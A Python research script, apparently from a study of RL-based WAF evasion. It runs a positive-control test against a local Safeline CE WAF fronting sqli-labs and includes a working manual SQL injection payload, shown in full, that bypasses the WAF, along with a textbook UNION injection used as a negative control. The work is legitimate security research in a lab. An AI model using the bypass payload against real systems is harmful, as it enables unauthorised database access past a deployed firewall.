"""
tools/safeline_poscontrol.py
============================
POSITIVE CONTROL for RQ2 (ModSec -> Safeline transfer).

Purpose: prove that the Safeline CE WAF (port 8888) is *bypassable in principle*,
so that the 0% zero-shot transfer result of the ModSec-trained RL policies is a
GENUINE policy-mismatch finding, not a measurement artifact (i.e. not "Safeline
blocks 100% of everything, therefore 0% by construction").

It sends three requests and reports their status:
  1. BENIGN control        -> expect 200 (connectivity OK, not everything blocked)
  2. NAIVE SQLi (neg ctrl)  -> expect 403 (Safeline IS active and blocks textbook SQLi)
  3. MANUAL PoC bypass      -> expect 200 + injected data (Safeline bypassable)

The PoC payload was found by manual pentest of the lab. It evades Safeline's ML
detector with a fundamentally different strategy than the regex-surface tricks the
RL agent learned for ModSec: decimal prefix `.1`, `--+-` / `'/0` context breakers,
UNION ALL, and CURRENT_DATE (returns data with no conspicuous SQLi keyword).

NOTE: this performs live HTTP SQLi requests -> run it yourself in WSL (Claude is
blocked from running HTTP-SQLi commands). Paste the output back for the record.

USAGE:
    python3 -m tools.safeline_poscontrol
    python3 -m tools.safeline_poscontrol --base http://localhost:8888/Less-1/ \
        --output results/safeline_poscontrol.json
"""
import argparse
import json
import re
import sys

import requests

# The pre-encoded query string for each case. We send these EXACTLY (no re-encoding)
# by appending them to the base URL, so the WAF sees the same bytes the browser did.
BENIGN_Q = "id=1"
NAIVE_Q  = "id=1%27%20UNION%20SELECT%201,2,3--%20-"          # textbook union, expect 403
POC_Q    = "id=.1--+-%27/0+UNION+ALL+SELECT+1,CURRENT_DATE,3%27"  # manual bypass, expect 200

# Signatures that indicate the injection actually returned data through sqli-labs.
DATA_SIGNATURES = [
    re.compile(r"\d{4}-\d{2}-\d{2}"),          # CURRENT_DATE output (YYYY-MM-DD)
    re.compile(r"Your Login name", re.I),       # sqli-labs union echo (col 2)
    re.compile(r"Your Password", re.I),         # sqli-labs union echo (col 3)
]

CASES = [
    ("benign_control",   BENIGN_Q, 200, "connectivity OK; not everything is blocked"),
    ("naive_sqli_negctl", NAIVE_Q, 403, "Safeline active: textbook SQLi blocked"),
    ("manual_poc_bypass", POC_Q,   200, "Safeline bypassable: crafted payload passes + returns data"),
]


def send(base: str, query: str) -> dict:
    url = base.rstrip("/") + "/?" + query
    try:
        r = requests.get(url, timeout=15, allow_redirects=True,
                         headers={"User-Agent": "Mozilla/5.0 (SeqSQLi-PoC/1.0)"})
    except requests.exceptions.RequestException as e:
        return {"url": url, "error": str(e), "status": None, "len": 0, "data_returned": False}
    body = r.text or ""
    return {
        "url": url,
        "status": r.status_code,
        "len": len(body),
        "data_returned": any(p.search(body) for p in DATA_SIGNATURES),
    }


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--base", default="http://localhost:8888/Less-1/",
                    help="Safeline-fronted lab base (default: http://localhost:8888/Less-1/)")
    ap.add_argument("--output", default=None, help="Optional JSON report path")
    args = ap.parse_args()

    print(f"[*] Positive control vs {args.base}\n")
    print(f"  {'case':<20} {'status':>6} {'expect':>6} {'data':>5}  verdict")
    print("  " + "-" * 70)

    results = []
    all_ok = True
    for name, query, expect, note in CASES:
        res = send(args.base, query)
        res["case"] = name
        res["expected_status"] = expect
        res["note"] = note

        status = res["status"]
        ok = (status == expect)
        # the PoC case additionally requires data to be returned to count as a real bypass
        if name == "manual_poc_bypass":
            ok = ok and res["data_returned"]
        all_ok = all_ok and ok
        results.append(res)

        verdict = "PASS" if ok else "FAIL"
        data_flag = "yes" if res["data_returned"] else "no"
        shown = status if status is not None else f"ERR({res.get('error','?')[:20]})"
        print(f"  {name:<20} {str(shown):>6} {expect:>6} {data_flag:>5}  {verdict}  - {note}")

    print("\n  " + "-" * 70)
    if all_ok:
        print("  ==> POSITIVE CONTROL PASSED: Safeline is bypassable (200 + data) yet")
        print("      blocks textbook SQLi (403). The RL transfer 0% is therefore GENUINE.")
    else:
        print("  ==> Some case did not match expectation. Inspect statuses before")
        print("      treating the 0% transfer result as conclusive.")

    if args.output:
        payload = {"base": args.base, "all_passed": all_ok, "cases": results}
        with open(args.output, "w") as f:
            json.dump(payload, f, indent=2)
        print(f"\n[*] Saved report -> {args.output}")

    sys.exit(0 if all_ok else 1)


if __name__ == "__main__":
    main()
